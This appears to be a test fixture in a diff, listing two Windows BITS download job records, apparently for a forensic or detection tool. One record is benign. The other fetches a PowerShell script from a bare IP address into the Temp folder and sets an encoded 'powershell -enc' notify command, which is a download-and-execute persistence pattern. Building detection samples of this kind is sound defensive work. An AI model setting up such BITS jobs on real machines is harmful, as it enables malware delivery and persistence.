@@ -1,0 +1,37 @@
+[
+  {
+    "JobId": "job-json-doc",
+    "JobGuid": "{66666666-6666-6666-6666-666666666666}",
+    "DisplayName": "json doc download",
+    "Owner": "alex",
+    "OwnerSID": "S-1-5-21-111-222-333-1001",
+    "State": "Transferred",
+    "Type": "Download",
+    "Priority": "Normal",
+    "RemoteUrl": "https://content.example.org/files/notes.txt",
+    "LocalPath": "C:\\Users\\alex\\Downloads\\notes.txt",
+    "CreationTime": "2026-05-10T12:00:00+00:00",
+    "ModificationTime": "2026-05-10T12:01:00+00:00",
+    "TransferCompletionTime": "2026-05-10T12:02:00+00:00",
+    "BytesTotal": 512,
+    "BytesTransferred": 512
+  },
+  {
+    "JobId": "job-json-script",
+    "JobGuid": "{77777777-7777-7777-7777-777777777777}",
+    "DisplayName": "json temp script",
+    "Owner": "alex",
+    "OwnerSID": "S-1-5-21-111-222-333-1001",
+    "State": "Transferred",
+    "Type": "Download",
+    "Priority": "Normal",
+    "RemoteUrl": "http://198.51.100.20/runme.ps1",
+    "LocalPath": "C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1",
+    "NotifyCmdLine": "powershell -enc SQBFAFgA",
+    "CreationTime": "2026-05-10T12:10:00+00:00",
+    "ModificationTime": "2026-05-10T12:11:00+00:00",
+    "TransferCompletionTime": "2026-05-10T12:12:00+00:00",
+    "BytesTotal": 2048,
+    "BytesTransferred": 2048
+  }
+]
